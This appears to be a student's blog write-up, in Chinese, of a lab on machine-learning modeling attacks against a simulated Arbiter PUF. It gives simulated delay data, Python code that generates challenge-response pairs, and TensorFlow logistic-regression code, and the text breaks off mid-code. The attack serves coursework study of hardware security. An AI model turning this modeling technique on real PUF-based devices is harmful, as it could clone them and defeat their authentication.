    <content type="html"><![CDATA[<h2 id="一、机器学习"><a href="#一、机器学习" class="headerlink" title="一、机器学习"></a>一、机器学习</h2><p>​    第一次接触机器学习，这个实验在做的过程中相当痛苦。在实验刚开始的很长一段时间内都没有建模的思路，而且机器学习也从来没有接触过。但是最后参考我们学校研究生学长的思路，还是将实验做出了最终正确的结果。</p><p>​    什么是机器学习？</p><p>​    1+1等于几 ?<br>    50<br>    笨，多了</p><p>​    1+2 等于几?<br>    20<br>    笨，多了</p><p>​    3+4 等于几?<br>    7<br>    真聪明，对了</p><p>​    6+9 等于几?<br>    13<br>    笨，少了</p><p>​    久而久之……</p><p>​    2+2 等于几? 4</p><p>​    4+5 等于几? 9</p><p>​    这就是机器学习，准确来说是最常见的一种，监督学习。最开始的几步是对于模型的训练，“多了”或“少了”可以理解为训练时的误差，模型根据误差调整自身参数，这就是机器学习里常用的反向传播(Backpropagation)的简单的解释。</p><p>​    在传统的利用计算机解决问题的途径中，我们通常是给定一个输入，通过施加一定的条件（或算法），最终得到一个输出结果。这也就是把通常的生活问题转化成一个计算问题，通过设计算法，来解决问题。如下图：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqps6pwlskj30k808s768.jpg" alt=""></p><p>​    但是有一类问题，人类是找不到这样的模式，来解决问题的。以 OCR 字符识别为例，输入是手写体(数字)图片，输出是 0-9 字符串，我们并不知道怎么把输入转换成输出，因为手写体因人而异，随机性很大。</p><p>​    换句话说，这个时候，我们缺的是知识(如何映射)，不过幸运的是，我们有(实例)数据。</p><p>​    而把这个知识通过机器(计算机)学出来的过程，叫做机器学习。这个学出来的知识(或经验)，可以用于新的输入，产生新的输出。如下图：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqps7nf79bj30jp0bon25.jpg" alt=""></p><h2 id="二、PUF以及建模攻击分析"><a href="#二、PUF以及建模攻击分析" class="headerlink" title="二、PUF以及建模攻击分析"></a>二、PUF以及建模攻击分析</h2><p>​    物理不可克隆函数(Physical Unclonable Function，PUF)是一种新的轻量级硬件安全原语。当输入一个激励时，PUF 利用芯片制造过程中难以预测的工艺偏差(Process Variation)，输出依赖于芯片的不可克隆的响应，非常适合资源受限环境下的设备认证。然而，攻击者可以收集一定数量的激励响应对将 PUF 进行建模，因此，PUF 易受基于机器学习建模攻击。下图是一种典型的PUF——Arbiter PUF，其中{C1,C2,…,Cn-1,Cn}共同组成激励，r为响应。其原理是:一个脉冲信号 T 会在Arbiter PUF 上下两条路径同时传播，通过激励{C1,C2,…,Cn-1,Cn}改变路径(如 C1=1 时，在 M1 阶段交叉传播;C1=0 时，在 M1 阶段平行传播)，由于工艺偏差会影响不同路径的传播快慢，最终导致上下两条路径信号传播产生快慢差异，比较传播快慢生成激励响应r(0 或 1)。结构的示意图如下：            </p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqpsix5lplj30l4089401.jpg" alt=""></p><p>​    我们假定示意图中的n为64，也就是我们组成激励为64位。下面我们来分析一下这个结构。一共64位的激励输入，也就是2^64种激励组合，在加上的最后一位的输出，组成了我们的数据集。</p><p>​    但是如果只把64位的01串和最后的一位01输出当做建模的结果的话，放进机器学习的算法中进行训练的话，不管数据集有多大，最后的测试结果正确率只能有50%左右，因为这样屏蔽了PUF内部的工作结构。因此我们的建模方式必须要考虑PUF内部的工作结构，能够把电流传播的路径考虑进去。</p><h2 id="三、逻辑回归与SVM"><a href="#三、逻辑回归与SVM" class="headerlink" title="三、逻辑回归与SVM"></a>三、逻辑回归与SVM</h2><p>​    逻辑回归是这样的一个过程：面对一个回归或者分类问题，建立代价函数，然后通过优化方法迭代求解出最优的模型参数，然后测试验证我们这个求解的模型的好坏。Logistic回归虽然名字里带“回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别）回归模型中，y是一个定性变量，比如y=0或1，logistic方法主要应用于研究某些事件发生的概率。</p><p>​    SVM（Support Vector Machines）——支持向量机是在所有知名的数据挖掘算法中最健壮，最准确的方法之一，它属于二分类算法，可以支持线性和非线性的分类。</p><p>参考：</p><p><a href="https://blog.csdn.net/chibangyuxun/article/details/53148005" target="_blank" rel="noopener">https://blog.csdn.net/chibangyuxun/article/details/53148005</a></p><p><a href="https://zhuanlan.zhihu.com/p/28860065" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28860065</a></p><h2 id="四、PUF建模"><a href="#四、PUF建模" class="headerlink" title="四、PUF建模"></a>四、PUF建模</h2><p>​    我们知道逻辑回归的公式是:</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqpt92snn0j30ki01jdfv.jpg" alt=""></p><p>​    相对于线性回归，它在多了 sigmoid 函数(上图公式中的 g()函数)，g()的作用是使得 Y 的值保持在 0 到 1 之间，其表达式如下:</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqpvaqtl2uj30l401rglm.jpg" alt=""></p><p>​    我们拥有简单的逻辑回归公式，是不是简单的将 Arbiter PUF 的输入激励当做逻辑回归的输入{x1,x2,…,xn }就行了呢?显然是不行的。</p><p>​    我们建模要符合 Arbiter PUF 实际的工作原理。举如下例子:</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqpve047zrj30o20ahdh1.jpg" alt=""></p><p>​    如图，这是一个简单 4 阶 Arbiter PUF 对应激励(1011)的路径图，我们产生一位响应，只需要比较蓝红两条路径的信号传播快慢就行了。我们设逻辑回归的参数为{w0,w1,w2,w3,w4}，如果以(1011)作为输入，得到的结果为 w0+w1+w3+w4显然没有任何意义。</p><p>​    这时就需要变通了，我们需要在输入或者设参数上做点手脚来遵循 Arbiter-PUF 的工作原理。这里对 Arbiter PUF 的所有延迟段进行设参数。图中的(w11,w12,w13,w14)对应之前图中的(p,s,t,q)，这时我们产生响应相当于比较(w12+w24+w33+w42)和(w13+w21+w32+w43)的大小。即判断以下两个矩阵对应位置相乘后求和的正负。</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqpvn0q51xj30lv0380t1.jpg" alt=""></p><p>​    可见激励(1011)和矩阵 C 是一一对应的，我们只需要对激励进行扩展就能完成建模。注意这里的矩阵相乘不是线性代数中的矩阵相乘，而是对应位置的数相乘。其实只要把矩阵做一下转置就可以对应线性代数中的矩阵相乘了。最终，我们把C矩阵编程一个1*256的矩阵，即把每行拼接起来，在编程进行计算做最后的一位01输出，我们的数据集手机方式就得以实现了。由于SVM算法的特性，我们需要把最后输出的0改为-1，以更方便来计算。</p><p>​    下面是各个路径对应的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">194.606</span>, <span class="number">195.394</span>, <span class="number">196.01</span>, <span class="number">195.874</span>, <span class="number">194.794</span>, <span class="number">193.683</span>, <span class="number">192.148</span>, <span class="number">195.4</span>, <span class="number">194.362</span>, <span class="number">193.634</span>, <span class="number">195.452</span>, <span class="number">192.461</span>, <span class="number">194.52</span>,</span><br><span class="line">        <span class="number">194.18</span>, <span class="number">194.802</span>, <span class="number">192.773</span>, <span class="number">194.291</span>, <span class="number">195.502</span>, <span class="number">195.698</span>, <span class="number">193.55</span>, <span class="number">196.461</span>, <span class="number">193.983</span>, <span class="number">196.106</span>, <span class="number">195.993</span>, <span class="number">195.995</span>,</span><br><span class="line">        <span class="number">195.289</span>, <span class="number">194.944</span>, <span class="number">194.071</span>, <span class="number">196.365</span>, <span class="number">194.347</span>, <span class="number">194.936</span>, <span class="number">194.951</span>, <span class="number">196.044</span>, <span class="number">194.796</span>, <span class="number">195.777</span>, <span class="number">193.982</span>, <span class="number">196.579</span>,</span><br><span class="line">        <span class="number">194.747</span>, <span class="number">196.359</span>, <span class="number">194.955</span>, <span class="number">196.574</span>, <span class="number">194.404</span>, <span class="number">194.944</span>, <span class="number">193.574</span>, <span class="number">195.21</span>, <span class="number">195.17</span>, <span class="number">193.35</span>, <span class="number">193.762</span>, <span class="number">193.704</span>, <span class="number">195.66</span>,</span><br><span class="line">        <span class="number">194.801</span>, <span class="number">195.984</span>, <span class="number">195.22</span>, <span class="number">195.836</span>, <span class="number">195.341</span>, <span class="number">195.87</span>, <span class="number">196.222</span>, <span class="number">196.488</span>, <span class="number">194.434</span>, <span class="number">193.008</span>, <span class="number">194.658</span>, <span class="number">196.154</span>,</span><br><span class="line">        <span class="number">194.116</span>, <span class="number">192.048</span>,</span><br><span class="line">        <span class="number">194.615</span>, <span class="number">195.435</span>, <span class="number">196.026</span>, <span class="number">195.86</span>, <span class="number">194.767</span>, <span class="number">193.7</span>, <span class="number">192.157</span>, <span class="number">195.408</span>, <span class="number">194.414</span>, <span class="number">193.562</span>, <span class="number">195.477</span>, <span class="number">192.475</span>,</span><br><span class="line">        <span class="number">194.526</span>, <span class="number">194.178</span>, <span class="number">194.732</span>, <span class="number">192.583</span>, <span class="number">194.308</span>, <span class="number">195.519</span>, <span class="number">195.74</span>, <span class="number">193.585</span>, <span class="number">196.455</span>, <span class="number">194.032</span>, <span class="number">196.068</span>, <span class="number">196.012</span>,</span><br><span class="line">        <span class="number">196.055</span>, <span class="number">195.308</span>, <span class="number">194.953</span>, <span class="number">194.048</span>, <span class="number">196.423</span>, <span class="number">194.362</span>, <span class="number">194.977</span>, <span class="number">194.975</span>, <span class="number">196.081</span>, <span class="number">194.846</span>, <span class="number">195.799</span>, <span class="number">193.943</span>,</span><br><span class="line">        <span class="number">196.653</span>, <span class="number">194.844</span>, <span class="number">196.344</span>, <span class="number">195.02</span>, <span class="number">196.567</span>, <span class="number">194.385</span>, <span class="number">195.002</span>, <span class="number">193.54</span>, <span class="number">195.605</span>, <span class="number">195.719</span>, <span class="number">193.845</span>, <span class="number">193.85</span>,</span><br><span class="line">        <span class="number">193.702</span>, <span class="number">195.78</span>, <span class="number">194.8</span>, <span class="number">195.994</span>, <span class="number">195.06</span>, <span class="number">195.775</span>, <span class="number">195.308</span>, <span class="number">195.85</span>, <span class="number">196.388</span>, <span class="number">196.52</span>, <span class="number">194.348</span>, <span class="number">192.991</span>, <span class="number">194.688</span>,</span><br><span class="line">        <span class="number">196.296</span>, <span class="number">194.132</span>, <span class="number">192.139</span>,</span><br><span class="line">        <span class="number">194.643</span>, <span class="number">195.384</span>, <span class="number">195.969</span>, <span class="number">195.894</span>, <span class="number">194.776</span>, <span class="number">193.682</span>, <span class="number">192.129</span>, <span class="number">195.555</span>, <span class="number">194.426</span>, <span class="number">193.58</span>, <span class="number">195.446</span>, <span class="number">192.459</span>,</span><br><span class="line">        <span class="number">194.55</span>, <span class="number">194.2</span>, <span class="number">194.764</span>, <span class="number">192.783</span>, <span class="number">194.282</span>, <span class="number">195.54</span>, <span class="number">195.736</span>, <span class="number">193.621</span>, <span class="number">196.422</span>, <span class="number">194.011</span>, <span class="number">196.165</span>, <span class="number">195.98</span>, <span class="number">196.046</span>,</span><br><span class="line">        <span class="number">195.371</span>, <span class="number">194.909</span>, <span class="number">194.053</span>, <span class="number">196.373</span>, <span class="number">194.323</span>, <span class="number">194.997</span>, <span class="number">194.996</span>, <span class="number">196.169</span>, <span class="number">194.818</span>, <span class="number">195.829</span>, <span class="number">193.953</span>, <span class="number">196.678</span>,</span><br><span class="line">        <span class="number">194.829</span>, <span class="number">196.411</span>, <span class="number">195.006</span>, <span class="number">196.552</span>, <span class="number">194.398</span>, <span class="number">194.999</span>, <span class="number">193.572</span>, <span class="number">195.651</span>, <span class="number">195.73</span>, <span class="number">193.907</span>, <span class="number">193.793</span>, <span class="number">193.698</span>,</span><br><span class="line">        <span class="number">195.06</span>, <span class="number">194.838</span>, <span class="number">195.955</span>, <span class="number">195.053</span>, <span class="number">195.746</span>, <span class="number">195.359</span>, <span class="number">195.877</span>, <span class="number">196.354</span>, <span class="number">196.494</span>, <span class="number">194.449</span>, <span class="number">192.957</span>, <span class="number">194.704</span>,</span><br><span class="line">        <span class="number">196.18</span>, <span class="number">194.108</span>, <span class="number">192.211</span>,</span><br><span class="line">        <span class="number">194.558</span>, <span class="number">195.428</span>, <span class="number">196.014</span>, <span class="number">195.846</span>, <span class="number">194.833</span>, <span class="number">193.671</span>, <span class="number">192.1</span>, <span class="number">195.536</span>, <span class="number">194.341</span>, <span class="number">193.519</span>, <span class="number">195.585</span>, <span class="number">192.485</span>,</span><br><span class="line">        <span class="number">194.518</span>, <span class="number">194.184</span>, <span class="number">194.829</span>, <span class="number">192.84</span>, <span class="number">194.295</span>, <span class="number">195.572</span>, <span class="number">195.657</span>, <span class="number">193.571</span>, <span class="number">196.464</span>, <span class="number">194.05</span>, <span class="number">196.063</span>, <span class="number">195.891</span>,</span><br><span class="line">        <span class="number">196.012</span>, <span class="number">195.263</span>, <span class="number">194.978</span>, <span class="number">194.096</span>, <span class="number">196.328</span>, <span class="number">194.362</span>, <span class="number">194.92</span>, <span class="number">194.847</span>, <span class="number">196.08</span>, <span class="number">194.816</span>, <span class="number">195.736</span>, <span class="number">194.011</span>,</span><br><span class="line">        <span class="number">196.631</span>, <span class="number">194.738</span>, <span class="number">196.345</span>, <span class="number">194.996</span>, <span class="number">196.57</span>, <span class="number">194.413</span>, <span class="number">194.859</span>, <span class="number">193.54</span>, <span class="number">195.33</span>, <span class="number">195.24</span>, <span class="number">193.17</span>, <span class="number">193.733</span>, <span class="number">193.693</span>,</span><br><span class="line">        <span class="number">195.63</span>, <span class="number">194.807</span>, <span class="number">195.945</span>, <span class="number">195.65</span>, <span class="number">195.797</span>, <span class="number">195.355</span>, <span class="number">195.846</span>, <span class="number">196.234</span>, <span class="number">196.473</span>, <span class="number">194.456</span>, <span class="number">192.946</span>, <span class="number">194.744</span>,</span><br><span class="line">        <span class="number">196.188</span>, <span class="number">194.09</span>, <span class="number">192.009</span>]</span><br></pre></td></tr></table></figure><p>​    在实现过程中我们把数据导入到了csv文件中，并且把建模出来的数据导出到另外的csv文件中。</p><h2 id="五、逻辑回归建模攻击代码实现"><a href="#五、逻辑回归建模攻击代码实现" class="headerlink" title="五、逻辑回归建模攻击代码实现"></a>五、逻辑回归建模攻击代码实现</h2><h3 id="数据收集实现："><a href="#数据收集实现：" class="headerlink" title="数据收集实现："></a>数据收集实现：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shape</span><span class="params">(M)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> len(M), len(M[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">out1 = open(<span class="string">'traindatasetin.csv'</span>,<span class="string">'w'</span>)</span><br><span class="line">out2 = open(<span class="string">'traindatasetout.csv'</span>,<span class="string">'w'</span>)</span><br><span class="line">csv_writer1 = csv.writer(out1)</span><br><span class="line">csv_writer2 = csv.writer(out2)</span><br><span class="line">csv_file = csv.reader(open(<span class="string">'仿真Arbiter_PUF.csv'</span>,<span class="string">'r'</span>))</span><br><span class="line"></span><br><span class="line">PUFdelay_np = []</span><br><span class="line">PUFdelay = []</span><br><span class="line">delay1 = <span class="number">0</span></span><br><span class="line">delay2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> csv_file:</span><br><span class="line">    PUFdelay.append(i)</span><br><span class="line"></span><br><span class="line">PUFdelay_np = np.array(PUFdelay, dtype=float)</span><br><span class="line"></span><br><span class="line">C_np = [([<span class="number">0</span>] * <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">C_np_csv = []</span><br><span class="line">seed = <span class="string">"01"</span></span><br><span class="line">counter1 = <span class="number">0</span></span><br><span class="line"><span class="comment">#counter0 = 0</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> counter != <span class="number">2000</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">binary = random.choice(seed)</span><br><span class="line"><span class="keyword">if</span> binary == <span class="string">"1"</span>:</span><br><span class="line">delaymiddle = delay2</span><br><span class="line">delay2 = delay1</span><br><span class="line">delay1 = delaymiddle</span><br><span class="line">delay1 += float(PUFdelay[<span class="number">1</span>][i])</span><br><span class="line">delay2 += float(PUFdelay[<span class="number">2</span>][i])</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">0</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">0</span></span><br><span class="line">counter1 += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">1</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">-1</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> binary == <span class="string">"0"</span>:</span><br><span class="line">delay1 += float(PUFdelay[<span class="number">0</span>][i])</span><br><span class="line">delay2 += float(PUFdelay[<span class="number">3</span>][i])</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">0</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">0</span></span><br><span class="line"><span class="comment">#counter0 += 1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">-1</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">1</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">C_np_csv.append(C_np[i][j])</span><br><span class="line">csv_writer1.writerow(C_np_csv)</span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span>(delay1 &gt; delay2):</span><br><span class="line">csv_writer2.writerow(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">csv_writer2.writerow(<span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span>(delay1 &lt;= delay2):</span><br><span class="line">csv_writer2.writerow(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">csv_writer2.writerow(<span class="string">"0"</span>)</span><br><span class="line">counter1 = <span class="number">0</span></span><br><span class="line">delay1 = <span class="number">0</span></span><br><span class="line">delay2 = <span class="number">0</span></span><br><span class="line">C_np_csv = []</span><br><span class="line">counter += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="逻辑回归建模攻击实现："><a href="#逻辑回归建模攻击实现：" class="headerlink" title="逻辑回归建模攻击实现："></a>逻辑回归建模攻击实现：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function, division</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor</span><br><span class="line"><span class="keyword">import</span> sklearn.preprocessing <span class="keyword">as</span> preprocessing</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment">#tensorflow 实现 Logistic Regression</span></span><br><span class="line"><span class="comment">#读取数据</span></span><br><span class="line">x_test = pd.read_csv(<span class="string">"testdatasetin.csv"</span>, header=<span class="keyword">None</span>)  <span class="comment"># 测试集特征</span></span><br><span class="line">x_train = pd.read_csv(<span class="string">"traindatasetin.csv"</span>, header=<span class="keyword">None</span>)  <span class="comment"># 训练集特征</span></span><br><span class="line">y_train = pd.read_csv(<span class="string">"traindatasetout.csv"</span>, header=<span class="keyword">None</span>)  <span class="comment"># 训练集标签</span></span><br><span class="line">y_test = pd.read_csv(<span class="string">"testdatasetout.csv"</span>, header=<span class="keyword">None</span>)  <span class="comment"># 测试集标签</span></span><br><span class="line"></span><br><span class="line">y_train = tf.concat([<span class="number">1</span> - y_train, y_train], <span class="number">1</span>)</span><br><span class="line">y_test = tf.concat([<span class="number">1</span> - y_test, y_test], <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数定义</span></span><br><span class="line">learning_rate = <span class="number">0.05</span>  <span class="comment"># 学习率</span></span><br><span class="line">training_epochs = <span class="number">300</span>  <span class="comment"># 训练迭代次数</span></span><br><span class="line">batch_size = <span class="number">100</span>  <span class="comment"># 分页的每页大小（后面训练采用了批量处理的方法）</span></span><br><span class="line">display_step = <span class="number">15</span>  <span class="comment"># 何时打印到屏幕的参量</span></span><br><span class="line"></span><br><span class="line">n_samples = x_train.shape[<span class="number">0</span>]  <span class="comment"># sample_num 训练样本数量</span></span><br><span class="line">n_features = x_train.shape[<span class="number">1</span>]  <span class="comment"># feature_num 特征数量 256</span></span><br><span class="line">n_class = <span class="number">2</span></span><br><span class="line"><span class="comment">#变量定义</span></span><br><span class="line">x = tf.placeholder(tf.float32, [<span class="keyword">None</span>, n_features])</span><br><span class="line">y = tf.placeholder(tf.float32, [<span class="keyword">None</span>, n_class])</span><br><span class="line"><span class="comment">#权重定义</span></span><br><span class="line">W = tf.Variable(tf.zeros([n_features, n_class]), name=<span class="string">"weight"</span>)</span><br><span class="line">b = tf.Variable(tf.zeros([n_class]), name=<span class="string">"bias"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#y=x*w+b 线性</span></span><br><span class="line">pred = tf.matmul(x, W) + b</span><br><span class="line"></span><br><span class="line"><span class="comment">#准确率</span></span><br><span class="line">correct_prediction = tf.equal(tf.argmax(pred, <span class="number">1</span>), tf.argmax(y, <span class="number">1</span>))</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))</span><br><span class="line"></span><br><span class="line"><span class="comment">#损失</span></span><br><span class="line">cost = tf.reduce_sum(</span><br><span class="line">    tf.nn.softmax_cross_entropy_with_logits(logits=pred, labels=y))</span><br><span class="line"><span class="comment">#优化器</span></span><br><span class="line">optimizer = tf.train.GradientDescentOptimizer(learning_rate).minimize(cost)</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line">init = tf.global_variables_initializer()</span><br><span class="line"></span><br><span class="line">train_accuracy = []</span><br><span class="line">test_accuracy = []</span><br><span class="line">avg_cost = []</span><br><span class="line"><span class="comment">#训练</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">        sess.run(init)</span><br><span class="line">        <span class="keyword">for</span> epoch <span class="keyword">in</span> range(training_epochs):</span><br><span class="line">            <span class="comment">#avg_cost = 0</span></span><br><span class="line">            total_batch = int(n_samples / batch_size)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(total_batch):</span><br><span class="line">                _, c = sess.run([optimizer, cost],</span><br><span class="line">                                feed_dict=&#123;x: x_train[i * batch_size: (i + <span class="number">1</span>) * batch_size],</span><br><span class="line">                                           y: y_train[i * batch_size: (i + <span class="number">1</span>) * batch_size, :].eval()&#125;)</span><br><span class="line"></span><br><span class="line">                train_accuracy.append(accuracy.eval(</span><br><span class="line">                    &#123;x: x_train, y: y_train.eval()&#125;))</span><br><span class="line">                <span class="comment">#ax2.plot(epoch+1, avg_cost, 'c.')</span></span><br><span class="line">                test_accuracy.append(accuracy.eval(</span><br><span class="line">                    &#123;x: x_test, y: y_test.eval()&#125;))</span><br><span class="line">                avg_cost.append(c / total_batch)</span><br><span class="line">            <span class="comment">#plt.plot(epoch + 1, avg_cost, 'co')</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (epoch + <span class="number">1</span>) % display_step == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"Epoch:"</span>, <span class="string">"%04d"</span> % (epoch + <span class="number">1</span>), <span class="string">"cost="</span>, c/total_batch)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Optimization Finished!"</span>)</span><br><span class="line">        print(<span class="string">"Testing Accuracy:"</span>, accuracy.eval(</span><br><span class="line">            &#123;x: x_test, y: y_test.eval()&#125;))</span><br><span class="line"></span><br><span class="line">        plt.suptitle(<span class="string">"learning rate=%f  training epochs=%i  sample_num=%i"</span> % (</span><br><span class="line">            learning_rate, training_epochs, n_samples), size=<span 